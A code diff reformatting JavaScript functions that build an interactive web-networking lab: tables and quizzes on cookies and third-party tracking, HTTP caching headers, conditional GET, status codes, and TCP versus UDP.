+ {id:'sd2',label:'Value (first 5-10 chars)',ph:'e.g. A3FxK9pL...'},
+ {id:'sd3',label:'HttpOnly set?',ph:'Yes / No'},
+ {id:'sd4',label:'Secure set?',ph:'Yes / No'},
+ {id:'sd5',label:'Expiry / Max-Age',ph:'e.g. Session / 2 hours'},
+ {id:'sd6',label:'Site observed on',ph:'e.g. github.com'},
+ ],h='<div class="table-wrap"><table class="lab-table"><thead><tr><th style="width:200px">Field</th><th>Your observation</th></tr></thead><tbody>';
+ rows.forEach(function(r){h+='<tr><td class="row-label">'+r.label+'</td><td><input type="text" placeholder="'+r.ph+'" oninput="onT(\''+r.id+'\')" id="'+r.id+'"></td></tr>';});
+ return h+'</tbody></table></div>';
 }
 
 function thirdPartyScenario(){return '<div class="scenario-box">'+
-  '<div class="scene-label"> Scenario: The Sock Ad Mystery</div>'+
-  '<p><strong>Monday:</strong> You visit <strong>nytimes.com</strong>. The page loads an ad from <strong>AdX.com</strong>. AdX sets <code>AdX: 7493</code>. Records: "User 7493 reads NY Times Sports."</p><br>'+
-  '<p><strong>Tuesday:</strong> You visit <strong>socks.com</strong> &#x2014; also uses AdX ads. Browser sends <code>Cookie: 7493</code> to AdX. AdX now knows: "User 7493 visited socks.com."</p><br>'+
-  '<p><strong>Wednesday:</strong> Back on nytimes.com. AdX serves a <strong>targeted sock ad</strong>. You feel watched. </p>'+
-  '</div>'+
-  '<div class="info-box red"><h4>&#x1F575; Third-party cookies explained</h4><p>AdX\'s cookie was set by a domain you never deliberately visited. Because their ads appear on thousands of sites, they build a browsing profile of you across the entire web. This is exactly why browsers are removing third-party cookies.</p></div>';}
+ '<div class="scene-label"> Scenario: The Sock Ad Mystery</div>'+
+ '<p><strong>Monday:</strong> You visit <strong>nytimes.com</strong>. The page loads an ad from <strong>AdX.com</strong>. AdX sets <code>AdX: 7493</code>. Records: "User 7493 reads NY Times Sports."</p><br>'+
+ '<p><strong>Tuesday:</strong> You visit <strong>socks.com</strong> &#x2014; also uses AdX ads. Browser sends <code>Cookie: 7493</code> to AdX. AdX now knows: "User 7493 visited socks.com."</p><br>'+
+ '<p><strong>Wednesday:</strong> Back on nytimes.com. AdX serves a <strong>targeted sock ad</strong>. You feel watched. </p>'+
+ '</div>'+
+ '<div class="info-box red"><h4> Third-party cookies explained</h4><p>AdX\'s cookie was set by a domain you never deliberately visited. Because their ads appear on thousands of sites, they build a browsing profile of you across the entire web. This is exactly why browsers are removing third-party cookies.</p></div>';}
 
 // ---- Cache builders ----
 function cacheScenarios(){return '<div class="cache-timeline">'+
-  '<div class="cache-step miss"><div class="cs-num">Scenario A</div><div class="cs-title">&#x1F195; Cache Miss</div><div class="cs-detail">Cache empty &#x2192; forward to server &#x2192; store response<br><br>Status: 200 OK<br>Full body transferred</div></div>'+
-  '<div class="cache-step hit"><div class="cs-num">Scenario B</div><div class="cs-title"> Cache Hit (Fresh)</div><div class="cs-detail">Copy exists + within max-age<br><br>200 from cache<br>No network request!</div></div>'+
-  '<div class="cache-step check"><div class="cs-num">Scenario C</div><div class="cs-title">&#x1F50D; Conditional GET</div><div class="cs-detail">Expired &#x2192; ask server:<br><code>If-None-Match: "etag"</code><br><br>Unchanged: 304 (no body)<br>Changed: 200 + new data</div></div>'+
-  '</div><div class="info-box teal"><h4>Why this matters for you as a developer</h4><p>Update a CSS file but <code>max-age=86400</code> is set? Users won\'t see your change for 24 hours. Understanding caching saves you "why is my fix not live?!" panic at 3am.</p></div>';}
+ '<div class="cache-step miss"><div class="cs-num">Scenario A</div><div class="cs-title"> Cache Miss</div><div class="cs-detail">Cache empty &#x2192; forward to server &#x2192; store response<br><br>Status: 200 OK<br>Full body transferred</div></div>'+
+ '<div class="cache-step hit"><div class="cs-num">Scenario B</div><div class="cs-title"> Cache Hit (Fresh)</div><div class="cs-detail">Copy exists + within max-age<br><br>200 from cache<br>No network request!</div></div>'+
+ '<div class="cache-step check"><div class="cs-num">Scenario C</div><div class="cs-title"> Conditional GET</div><div class="cs-detail">Expired &#x2192; ask server:<br><code>If-None-Match: "etag"</code><br><br>Unchanged: 304 (no body)<br>Changed: 200 + new data</div></div>'+
+ '</div><div class="info-box teal"><h4>Why this matters for you as a developer</h4><p>Update a CSS file but <code>max-age=86400</code> is set? Users won\'t see your change for 24 hours. Understanding caching saves you "why is my fix not live?!" panic at 3am.</p></div>';}
 
 function cacheObserveTable(){
-  var rows=[
-    {id:'co1',label:'Resource URL',ph:'e.g. /assets/app.css'},
-    {id:'co2',label:'HTTP Status',ph:'e.g. 200, 304, "from disk cache"'},
-    {id:'co3',label:'Cache-Control value',ph:'e.g. max-age=3600, public'},
-    {id:'co4',label:'ETag or Last-Modified',ph:'e.g. "abc123..."'},
-    {id:'co5',label:'Content-Length (bytes)',ph:'e.g. 48231, empty for 304'},
-  ],h='<div class="table-wrap"><table class="lab-table"><thead><tr><th style="width:200px">Header / field</th><th>Value you observed</th></tr></thead><tbody>';
-  rows.forEach(function(r){h+='<tr><td class="row-label">'+r.label+'</td><td><input type="text" placeholder="'+r.ph+'" oninput="onT(\''+r.id+'\')" id="'+r.id+'"></td></tr>';});
-  return h+'</tbody></table></div>';
+ var rows=[
+ {id:'co1',label:'Resource URL',ph:'e.g. /assets/app.css'},
+ {id:'co2',label:'HTTP Status',ph:'e.g. 200, 304, "from disk cache"'},
+ {id:'co3',label:'Cache-Control value',ph:'e.g. max-age=3600, public'},
+ {id:'co4',label:'ETag or Last-Modified',ph:'e.g. "abc123..."'},
+ {id:'co5',label:'Content-Length (bytes)',ph:'e.g. 48231, empty for 304'},
+ ],h='<div class="table-wrap"><table class="lab-table"><thead><tr><th style="width:200px">Header / field</th><th>Value you observed</th></tr></thead><tbody>';
+ rows.forEach(function(r){h+='<tr><td class="row-label">'+r.label+'</td><td><input type="text" placeholder="'+r.ph+'" oninput="onT(\''+r.id+'\')" id="'+r.id+'"></td></tr>';});
+ return h+'</tbody></table></div>';
 }
 
-function cacheDecode(){return '<div class="info-box blue"><h4>&#x1F4D6; Decode this real-world Cache-Control header</h4><p>A server returns this for a versioned image asset:</p></div>'+
-  '<div class="cmd-block"><span class="os-tag mac">Response Header</span><br><span class="cmd">Cache-Control: public, max-age=31536000, immutable</span><br><span class="cmt"># What does each part mean?</span></div>'+
-  '<div class="table-wrap"><table class="lab-table"><thead><tr><th>Directive</th><th>What it means (your own words)</th></tr></thead><tbody>'+
-  '<tr><td class="row-label"><code>public</code></td><td><input type="text" placeholder="Who is allowed to cache this?" oninput="onT(\'ccd1\')" id="ccd1"></td></tr>'+
-  '<tr><td class="row-label"><code>max-age=31536000</code></td><td><input type="text" placeholder="How long is it valid? Calculate the days." oninput="onT(\'ccd2\')" id="ccd2"></td></tr>'+
-  '<tr><td class="row-label"><code>immutable</code></td><td><input type="text" placeholder="What does the server promise about this content?" oninput="onT(\'ccd3\')" id="ccd3"></td></tr>'+
-  '</tbody></table></div>'+
-  '<div class="info-box gray"><h4> Why use all three together?</h4><p>Used for <strong>versioned assets</strong> like <code>app.v3f9a2.css</code>. The content hash in the filename means the content truly never changes &#x2014; so cache it everywhere, for a full year, and skip revalidation entirely.</p></div>';}
+function cacheDecode(){return '<div class="info-box blue"><h4> Decode this real-world Cache-Control header</h4><p>A server returns this for a versioned image asset:</p></div>'+
+ '<div class="cmd-block"><span class="os-tag mac">Response Header</span><br><span class="cmd">Cache-Control: public, max-age=31536000, immutable</span><br><span class="cmt"># What does each part mean?</span></div>'+
+ '<div class="table-wrap"><table class="lab-table"><thead><tr><th>Directive</th><th>What it means (your own words)</th></tr></thead><tbody>'+
+ '<tr><td class="row-label"><code>public</code></td><td><input type="text" placeholder="Who is allowed to cache this?" oninput="onT(\'ccd1\')" id="ccd1"></td></tr>'+
+ '<tr><td class="row-label"><code>max-age=31536000</code></td><td><input type="text" placeholder="How long is it valid? Calculate the days." oninput="onT(\'ccd2\')" id="ccd2"></td></tr>'+
+ '<tr><td class="row-label"><code>immutable</code></td><td><input type="text" placeholder="What does the server promise about this content?" oninput="onT(\'ccd3\')" id="ccd3"></td></tr>'+
+ '</tbody></table></div>'+
+ '<div class="info-box gray"><h4> Why use all three together?</h4><p>Used for <strong>versioned assets</strong> like <code>app.v3f9a2.css</code>. The content hash in the filename means the content truly never changes &#x2014; so cache it everywhere, for a full year, and skip revalidation entirely.</p></div>';}
 
 function conditionalGet(){return '<div class="http-flow">'+
-  '<div class="http-msg req"><span class="msg-label">&#x2460; First request &#x2014; no cache yet</span>GET /logo.png HTTP/1.1\nHost: example.com</div>'+
-  '<div class="http-msg res"><span class="msg-label">&#x2461; Server &#x2014; full response + freshness markers</span>HTTP/1.1 200 OK\nCache-Control: max-age=3600\n<span class="hl">ETag: "a1b2c3d4"</span>\nContent-Length: 48231\n[full 48 KB image transferred]</div>'+
-  '<div class="http-arrow">&#x2193; 1 hour passes &#x2014; cache expires &#x2014; user visits again &#x2193;</div>'+
-  '<div class="http-msg req"><span class="msg-label">&#x2462; Conditional GET &#x2014; "has it changed?"</span>GET /logo.png HTTP/1.1\nHost: example.com\n<span class="hl">If-None-Match: "a1b2c3d4"</span></div>'+
-  '<div class="http-msg res"><span class="msg-label">&#x2463; Not modified &#x2014; no body sent at all!</span>HTTP/1.1 <span class="hl">304 Not Modified</span>\n[0 bytes transferred &#x2014; browser uses cached copy]</div>'+
-  '</div>';}
+ '<div class="http-msg req"><span class="msg-label"> First request &#x2014; no cache yet</span>GET /logo.png HTTP/1.1\nHost: example.com</div>'+
+ '<div class="http-msg res"><span class="msg-label"> Server &#x2014; full response + freshness markers</span>HTTP/1.1 200 OK\nCache-Control: max-age=3600\n<span class="hl">ETag: "a1b2c3d4"</span>\nContent-Length: 48231\n[full 48 KB image transferred]</div>'+
+ '<div class="http-arrow">&#x2193; 1 hour passes &#x2014; cache expires &#x2014; user visits again &#x2193;</div>'+
+ '<div class="http-msg req"><span class="msg-label"> Conditional GET &#x2014; "has it changed?"</span>GET /logo.png HTTP/1.1\nHost: example.com\n<span class="hl">If-None-Match: "a1b2c3d4"</span></div>'+
+ '<div class="http-msg res"><span class="msg-label"> Not modified &#x2014; no body sent at all!</span>HTTP/1.1 <span class="hl">304 Not Modified</span>\n[0 bytes transferred &#x2014; browser uses cached copy]</div>'+
+ '</div>';}
 
 function cacheQuiz(){
-  return [
-    {id:'cdq1',q:'Tells browser AND all proxies to <strong>never</strong> store this response',opts:['no-store','no-cache','private','must-revalidate'],ans:'no-store'},
-    {id:'cdq2',q:'Response may only be cached by the end browser, not a shared CDN',opts:['private','no-store','public','no-cache'],ans:'private'},
-    {id:'cdq3',q:'Cache must revalidate with server before serving a stale response',opts:['must-revalidate','no-cache','immutable','public'],ans:'must-revalidate'},
-    {id:'cdq4',q:'Content will <strong>never</strong> change &#x2014; skip revalidation entirely',opts:['immutable','no-store','max-age=0','public'],ans:'immutable'},
-  ].map(quizBlock).join('');
+ return [
+ {id:'cdq1',q:'Tells browser AND all proxies to <strong>never</strong> store this response',opts:['no-store','no-cache','private','must-revalidate'],ans:'no-store'},
+ {id:'cdq2',q:'Response may only be cached by the end browser, not a shared CDN',opts:['private','no-store','public','no-cache'],ans:'private'},
+ {id:'cdq3',q:'Cache must revalidate with server before serving a stale response',opts:['must-revalidate','no-cache','immutable','public'],ans:'must-revalidate'},
+ {id:'cdq4',q:'Content will <strong>never</strong> change &#x2014; skip revalidation entirely',opts:['immutable','no-store','max-age=0','public'],ans:'immutable'},
+ ].map(quizBlock).join('');
 }
 
 // ---- HTTP in Action builders (Ex4 from docx) ----
 function orderStagesTable(){
-  var stages=[
-    'Server Processing',
-    'TCP SYN-ACK',
-    'HTTP Response (200 OK)',
-    'DNS Lookup',
-    'HTTP Request',
-    'TCP SYN',
-  ];
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th style="width:60px">Order (1\u20136)</th><th>Stage</th><th>What happens here (one sentence)</th></tr></thead><tbody>';
-  stages.forEach(function(s,i){
-    h+='<tr><td><input type="text" placeholder="1\u20136" style="width:50px;text-align:center" oninput="onT(\'os'+i+'n\')" id="os'+i+'n"></td>'+
-       '<td class="row-label">'+s+'</td>'+
-       '<td><input type="text" placeholder="Describe in one sentence\u2026" oninput="onT(\'os'+i+'d\')" id="os'+i+'d"></td></tr>';
-  });
-  return h+'</tbody></table></div>';
+ var stages=[
+ 'Server Processing',
+ 'TCP SYN-ACK',
+ 'HTTP Response (200 OK)',
+ 'DNS Lookup',
+ 'HTTP Request',
+ 'TCP SYN',
+ ];
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th style="width:60px">Order (1\u20136)</th><th>Stage</th><th>What happens here (one sentence)</th></tr></thead><tbody>';
+ stages.forEach(function(s,i){
+ h+='<tr><td><input type="text" placeholder="1\u20136" style="width:50px;text-align:center" oninput="onT(\'os'+i+'n\')" id="os'+i+'n"></td>'+
+ '<td class="row-label">'+s+'</td>'+
+ '<td><input type="text" placeholder="Describe in one sentence\u2026" oninput="onT(\'os'+i+'d\')" id="os'+i+'d"></td></tr>';
+ });
+ return h+'</tbody></table></div>';
 }
 
 function headersTable(){
-  var lblStyle='font-family:var(--mono);font-size:12px;color:var(--txt);padding:4px 0;display:block';
-  var inputStyle='font-family:var(--mono);font-size:12px;border:1px solid var(--bdr);border-radius:4px;padding:3px 6px;width:100%;background:#fff';
-  function inp(id,w){ return '<input type="text" id="'+id+'" oninput="onT(\''+id+'\')" style="'+inputStyle+(w?';width:'+w:'')+'">'; }
-  return '<div class="compare-grid" style="margin:1rem 0">'+
-    // REQUEST side
-    '<div style="background:#E8F0FE;border:1.5px solid #85B7EB;border-radius:8px;padding:.9rem 1rem;font-family:var(--mono);font-size:12px;line-height:2">'+
-    '<strong style="font-size:11px;color:#0C447C;text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:.5rem">REQUEST</strong>'+
-    '<span style="'+lblStyle+'">'+inp('hb-method','70px')+' /index.html HTTP/1.1</span>'+
-    '<span style="'+lblStyle+'">Host: '+inp('hb-host','180px')+'</span>'+
-    '<span style="'+lblStyle+'">Accept: text/html,application/json</span>'+
-    '<span style="'+lblStyle+'">Connection: keep-alive</span>'+
-    '</div>'+
-    // RESPONSE side
-    '<div style="background:#E1F5EE;border:1.5px solid #5DCAA5;border-radius:8px;padding:.9rem 1rem;font-family:var(--mono);font-size:12px;line-height:2">'+
-    '<strong style="font-size:11px;color:#0F6E56;text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:.5rem">RESPONSE</strong>'+
-    '<span style="'+lblStyle+'">HTTP/1.1 '+inp('hb-status','50px')+' '+inp('hb-reason','120px')+'</span>'+
-    '<span style="'+lblStyle+'">Content-Type: text/html</span>'+
-    '<span style="'+lblStyle+'">Content-Length: 1256</span>'+
-    '<span style="'+lblStyle+'">Cache-Control: '+inp('hb-cc','200px')+'</span>'+
-    '<span style="'+lblStyle+'">body: &lt;html&gt;\u2026 1256 bytes \u2026&lt;/html&gt;</span>'+
-    '</div>'+
-    '</div>';}
+ var lblStyle='font-family:var(--mono);font-size:12px;color:var(--txt);padding:4px 0;display:block';
+ var inputStyle='font-family:var(--mono);font-size:12px;border:1px solid var(--bdr);border-radius:4px;padding:3px 6px;width:100%;background:#fff';
+ function inp(id,w){ return '<input type="text" id="'+id+'" oninput="onT(\''+id+'\')" style="'+inputStyle+(w?';width:'+w:'')+'">'; }
+ return '<div class="compare-grid" style="margin:1rem 0">'+
+ // REQUEST side
+ '<div style="background:#E8F0FE;border:1.5px solid #85B7EB;border-radius:8px;padding:.9rem 1rem;font-family:var(--mono);font-size:12px;line-height:2">'+
+ '<strong style="font-size:11px;color:#0C447C;text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:.5rem">REQUEST</strong>'+
+ '<span style="'+lblStyle+'">'+inp('hb-method','70px')+' /index.html HTTP/1.1</span>'+
+ '<span style="'+lblStyle+'">Host: '+inp('hb-host','180px')+'</span>'+
+ '<span style="'+lblStyle+'">Accept: text/html,application/json</span>'+
+ '<span style="'+lblStyle+'">Connection: keep-alive</span>'+
+ '</div>'+
+ // RESPONSE side
+ '<div style="background:#E1F5EE;border:1.5px solid #5DCAA5;border-radius:8px;padding:.9rem 1rem;font-family:var(--mono);font-size:12px;line-height:2">'+
+ '<strong style="font-size:11px;color:#0F6E56;text-transform:uppercase;letter-spacing:.06em;display:block;margin-bottom:.5rem">RESPONSE</strong>'+
+ '<span style="'+lblStyle+'">HTTP/1.1 '+inp('hb-status','50px')+' '+inp('hb-reason','120px')+'</span>'+
+ '<span style="'+lblStyle+'">Content-Type: text/html</span>'+
+ '<span style="'+lblStyle+'">Content-Length: 1256</span>'+
+ '<span style="'+lblStyle+'">Cache-Control: '+inp('hb-cc','200px')+'</span>'+
+ '<span style="'+lblStyle+'">body: &lt;html&gt;\u2026 1256 bytes \u2026&lt;/html&gt;</span>'+
+ '</div>'+
+ '</div>';}
 
 function statusRefTable(){
-  var codes=[
-    ['200 OK','2xx','Success response (GET, POST)'],
-    ['201 Created','2xx','Resource uploaded for the first time'],
-    ['202 Accepted','2xx','Accepted; processing not yet complete'],
-    ['204 No Content','2xx','Success; no body (often PUT/DELETE)'],
-    ['301 Moved Permanently','3xx','Permanent redirect to new URL'],
-    ['302 Found','3xx','Temporary redirect; search engines keep old link'],
-    ['304 Not Modified','3xx','Use cached resource; no body returned'],
-    ['307 Temporary Redirect','3xx','Resend with same method to new URL'],
-    ['400 Bad Request','4xx','Client error \u2014 malformed syntax'],
-    ['401 Unauthorized','4xx','Missing or invalid authentication'],
-    ['402 Payment Required','4xx','Reserved; used for paywalls/quotas'],
-    ['403 Forbidden','4xx','Server refuses to authorise the request'],
-    ['404 Not Found','4xx','Resource does not exist'],
-    ['408 Request Timeout','4xx','Server closing unused connection'],
-    ['500 Internal Server Error','5xx','Unexpected server condition'],
-    ['501 Not Implemented','5xx','Server lacks required functionality'],
-    ['502 Bad Gateway','5xx','Invalid upstream response'],
-    ['503 Service Unavailable','5xx','Server not ready (overloaded/maintenance)'],
-    ['504 Gateway Timeout','5xx','Upstream did not respond in time'],
-  ];
-  var fam={'2xx':'s2xx','3xx':'s3xx','4xx':'s4xx','5xx':'s5xx'};
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Status Code</th><th>Family</th><th>Meaning</th></tr></thead><tbody>';
-  codes.forEach(function(r){
-    h+='<tr><td class="row-label"><span class="status-badge '+fam[r[1]]+'" style="padding:2px 7px;font-size:11px">'+r[0]+'</span></td><td style="font-weight:600;color:var(--navy)">'+r[1]+'</td><td style="font-size:12.5px">'+r[2]+'</td></tr>';
-  });
-  return h+'</tbody></table></div>';}
+ var codes=[
+ ['200 OK','2xx','Success response (GET, POST)'],
+ ['201 Created','2xx','Resource uploaded for the first time'],
+ ['202 Accepted','2xx','Accepted; processing not yet complete'],
+ ['204 No Content','2xx','Success; no body (often PUT/DELETE)'],
+ ['301 Moved Permanently','3xx','Permanent redirect to new URL'],
+ ['302 Found','3xx','Temporary redirect; search engines keep old link'],
+ ['304 Not Modified','3xx','Use cached resource; no body returned'],
+ ['307 Temporary Redirect','3xx','Resend with same method to new URL'],
+ ['400 Bad Request','4xx','Client error \u2014 malformed syntax'],
+ ['401 Unauthorized','4xx','Missing or invalid authentication'],
+ ['402 Payment Required','4xx','Reserved; used for paywalls/quotas'],
+ ['403 Forbidden','4xx','Server refuses to authorise the request'],
+ ['404 Not Found','4xx','Resource does not exist'],
+ ['408 Request Timeout','4xx','Server closing unused connection'],
+ ['500 Internal Server Error','5xx','Unexpected server condition'],
+ ['501 Not Implemented','5xx','Server lacks required functionality'],
+ ['502 Bad Gateway','5xx','Invalid upstream response'],
+ ['503 Service Unavailable','5xx','Server not ready (overloaded/maintenance)'],
+ ['504 Gateway Timeout','5xx','Upstream did not respond in time'],
+ ];
+ var fam={'2xx':'s2xx','3xx':'s3xx','4xx':'s4xx','5xx':'s5xx'};
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Status Code</th><th>Family</th><th>Meaning</th></tr></thead><tbody>';
+ codes.forEach(function(r){
+ h+='<tr><td class="row-label"><span class="status-badge '+fam[r[1]]+'" style="padding:2px 7px;font-size:11px">'+r[0]+'</span></td><td style="font-weight:600;color:var(--navy)">'+r[1]+'</td><td style="font-size:12.5px">'+r[2]+'</td></tr>';
+ });
+ return h+'</tbody></table></div>';}
 
 function diagnoseTable(){
-  var scenarios=[
-    'You submit a form with a misspelled field name. The server can\'t even parse the JSON.',
-    'You upload a new user record. The server saves it and returns a Location header to /api/users/42.',
-    'You request /old-blog. The site moved years ago and the link is permanent.',
-    'Your session cookie has expired. The server doesn\'t know who you are anymore.',
-    'You GET a static .css file. Your browser already has a fresh copy in cache.',
-    'The web server is fine, but the database it depends on just crashed.',
-    'You try to DELETE another user\'s photo. You\'re logged in, but it isn\'t yours.',
-    'The video chat endpoint hasn\'t shipped support for HEAD requests yet.',
-  ];
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Scenario</th><th style="width:80px">Code</th><th>Why (one sentence)</th></tr></thead><tbody>';
-  scenarios.forEach(function(sc,i){
-    h+='<tr><td class="row-label" style="white-space:normal;min-width:200px;font-weight:400;color:var(--txt)">'+sc+'</td>'+
-       '<td><input type="text" placeholder="e.g. 404" style="width:70px;text-align:center" oninput="onT(\'diag'+i+'c\')" id="diag'+i+'c"></td>'+
-       '<td><input type="text" placeholder="Explain\u2026" oninput="onT(\'diag'+i+'w\')" id="diag'+i+'w"></td></tr>';
-  });
-  return h+'</tbody></table></div>';}
+ var scenarios=[
+ 'You submit a form with a misspelled field name. The server can\'t even parse the JSON.',
+ 'You upload a new user record. The server saves it and returns a Location header to /api/users/42.',
+ 'You request /old-blog. The site moved years ago and the link is permanent.',
+ 'Your session cookie has expired. The server doesn\'t know who you are anymore.',
+ 'You GET a static .css file. Your browser already has a fresh copy in cache.',
+ 'The web server is fine, but the database it depends on just crashed.',
+ 'You try to DELETE another user\'s photo. You\'re logged in, but it isn\'t yours.',
+ 'The video chat endpoint hasn\'t shipped support for HEAD requests yet.',
+ ];
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Scenario</th><th style="width:80px">Code</th><th>Why (one sentence)</th></tr></thead><tbody>';
+ scenarios.forEach(function(sc,i){
+ h+='<tr><td class="row-label" style="white-space:normal;min-width:200px;font-weight:400;color:var(--txt)">'+sc+'</td>'+
+ '<td><input type="text" placeholder="e.g. 404" style="width:70px;text-align:center" oninput="onT(\'diag'+i+'c\')" id="diag'+i+'c"></td>'+
+ '<td><input type="text" placeholder="Explain\u2026" oninput="onT(\'diag'+i+'w\')" id="diag'+i+'w"></td></tr>';
+ });
+ return h+'</tbody></table></div>';}
 
 function failureTable(){
-  var scenarios=['408 Timeout','500','502','503','504'];
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr>'+
-    '<th>Scenario</th><th>Stage it fails at</th>'+
-    '<th>Who owns the bug?<br><small style="font-weight:400">(client / server / upstream)</small></th>'+
-    '</tr></thead><tbody>';
-  scenarios.forEach(function(s,i){
-    h+='<tr><td class="row-label">'+s+'</td>'+
-       '<td><input type="text" placeholder="e.g. DNS resolution" oninput="onT(\'fail'+i+'s\')" id="fail'+i+'s"></td>'+
-       '<td><input type="text" placeholder="e.g. network" oninput="onT(\'fail'+i+'o\')" id="fail'+i+'o"></td></tr>';
-  });
-  return h+'</tbody></table></div>';}
+ var scenarios=['408 Timeout','500','502','503','504'];
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr>'+
+ '<th>Scenario</th><th>Stage it fails at</th>'+
+ '<th>Who owns the bug?<br><small style="font-weight:400">(client / server / upstream)</small></th>'+
+ '</tr></thead><tbody>';
+ scenarios.forEach(function(s,i){
+ h+='<tr><td class="row-label">'+s+'</td>'+
+ '<td><input type="text" placeholder="e.g. DNS resolution" oninput="onT(\'fail'+i+'s\')" id="fail'+i+'s"></td>'+
+ '<td><input type="text" placeholder="e.g. network" oninput="onT(\'fail'+i+'o\')" id="fail'+i+'o"></td></tr>';
+ });
+ return h+'</tbody></table></div>';}
 
 function tcpUdpCompare(){
-  var rows=[
-    ['Connection setup steps (count from animation)','tcpu1a','tcpu1b'],
-    ['Reliability \u2014 what happens if a packet is lost?','tcpu2a','tcpu2b'],
-    ['Ordering \u2014 are packets guaranteed in order?','tcpu3a','tcpu3b'],
-    ['Speed feel (time before any real data flows)','tcpu4a','tcpu4b'],
-    ['Best for: tiny / one-off queries?','tcpu5a','tcpu5b'],
-    ['Best for: large reliable transfers?','tcpu6a','tcpu6b'],
-    ['Best for: real-time streaming or games?','tcpu7a','tcpu7b'],
-  ];
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Property</th><th style="width:35%">TCP</th><th style="width:35%">UDP</th></tr></thead><tbody>';
-  rows.forEach(function(r){
-    h+='<tr><td class="row-label">'+r[0]+'</td>'+
-       '<td><input type="text" oninput="onT(\''+r[1]+'\')" id="'+r[1]+'"></td>'+
-       '<td><input type="text" oninput="onT(\''+r[2]+'\')" id="'+r[2]+'"></td></tr>';
-  });
-  return h+'</tbody></table></div>';}
+ var rows=[
+ ['Connection setup steps (count from animation)','tcpu1a','tcpu1b'],
+ ['Reliability \u2014 what happens if a packet is lost?','tcpu2a','tcpu2b'],
+ ['Ordering \u2014 are packets guaranteed in order?','tcpu3a','tcpu3b'],
+ ['Speed feel (time before any real data flows)','tcpu4a','tcpu4b'],
+ ['Best for: tiny / one-off queries?','tcpu5a','tcpu5b'],
+ ['Best for: large reliable transfers?','tcpu6a','tcpu6b'],
+ ['Best for: real-time streaming or games?','tcpu7a','tcpu7b'],
+ ];
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Property</th><th style="width:35%">TCP</th><th style="width:35%">UDP</th></tr></thead><tbody>';
+ rows.forEach(function(r){
+ h+='<tr><td class="row-label">'+r[0]+'</td>'+
+ '<td><input type="text" oninput="onT(\''+r[1]+'\')" id="'+r[1]+'"></td>'+
+ '<td><input type="text" oninput="onT(\''+r[2]+'\')" id="'+r[2]+'"></td></tr>';
+ });
+ return h+'</tbody></table></div>';}
 
 function udpScenariosTable(){
-  var sc=['DNS Query','Video Stream','Game Packet','Packet Loss','Out of Order'];
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Scenario</th><th>What you observed \u2014 and why is UDP a good or bad fit here?</th></tr></thead><tbody>';
-  sc.forEach(function(s,i){
-    h+='<tr><td class="row-label">'+s+'</td>'+
-       '<td><input type="text" placeholder="Describe\u2026" oninput="onT(\'udp'+i+'\')" id="udp'+i+'"></td></tr>';
-  });
-  return h+'</tbody></table></div>';}
+ var sc=['DNS Query','Video Stream','Game Packet','Packet Loss','Out of Order'];
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Scenario</th><th>What you observed \u2014 and why is UDP a good or bad fit here?</th></tr></thead><tbody>';
+ sc.forEach(function(s,i){
+ h+='<tr><td class="row-label">'+s+'</td>'+
+ '<td><input type="text" placeholder="Describe\u2026" oninput="onT(\'udp'+i+'\')" id="udp'+i+'"></td></tr>';
+ });
+ return h+'</tbody></table></div>';}
 
 function protocolPickerTable(){
-  var apps=[
-    'Downloading a 4 MB PDF',
-    'Live multiplayer first-person shooter',
-    'DNS lookup',
-    'Sending an email through SMTP',
-    'Live voice call',
-    'Logging into your bank',
-    'Streaming a movie (Netflix-style)',
-    'IoT temperature sensor \u2014 one reading per minute',
-  ];
-  var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Application</th><th style="width:70px;text-align:center">Protocol</th><th>Why?</th></tr></thead><tbody>';
-  apps.forEach(function(a,i){
-    h+='<tr><td class="row-label" style="white-space:normal;font-weight:400;color:var(--txt)">'+a+'</td>'+
-       '<td><select onchange="onT(\'pp'+i+'p\')" id="pp'+i+'p" style="font-size:12px"><option value="">&#x2014;</option><option>TCP</option><option>UDP</option><option>Either</option></select></td>'+
-       '<td><input type="text" placeholder="Justify in one line\u2026" oninput="onT(\'pp'+i+'w\')" id="pp'+i+'w"></td></tr>';
-  });
-  return h+'</tbody></table></div>';}
+ var apps=[
+ 'Downloading a 4 MB PDF',
+ 'Live multiplayer first-person shooter',
+ 'DNS lookup',
+ 'Sending an email through SMTP',
+ 'Live voice call',
+ 'Logging into your bank',
+ 'Streaming a movie (Netflix-style)',
+ 'IoT temperature sensor \u2014 one reading per minute',
+ ];
+ var h='<div class="table-wrap"><table class="lab-table"><thead><tr><th>Application</th><th style="width:70px;text-align:center">Protocol</th><th>Why?</th></tr></thead><tbody>';
+ apps.forEach(function(a,i){
+ h+='<tr><td class="row-label" style="white-space:normal;font-weight:400;color:var(--txt)">'+a+'</td>'+
+ '<td><select onchange="onT(\'pp'+i+'p\')" id="pp'+i+'p" style="font-size:12px"><option value="">&#x2014;</option><option>TCP</option><option>UDP</option><option>Either</option></select></td>'+
+ '<td><input type="text" placeholder="Justify in one line\u2026" oninput="onT(\'pp'+i+'w\')" id="pp'+i+'w"></td></tr>';
+ });
+ return h+'</tbody></table></div>';}
 
 // ---- Grand finale builders ----
 function grandScenario(){return '<div class="scenario-box">'+
-  '<div class="scene-label">&#x1F6CD; Alice shops on DevStore.th &#x2014; 8 events, all 5 mechanisms</div>'+
-  '<p><strong>Event 1.</strong> Alice types <strong>https://devstore.th</strong>. The browser performs a <strong>TLS handshake</strong>: the server certificate is verified, a shared secret is negotiated. All traffic is now encrypted. <em>(Port 443)</em></p><br>'+
-  '<p><strong>Event 2.</strong> The server returns the HTML. The hero banner (2 MB image) response includes <code>Cache-Control: max-age=604800</code>. The browser stores it locally.</p><br>'+
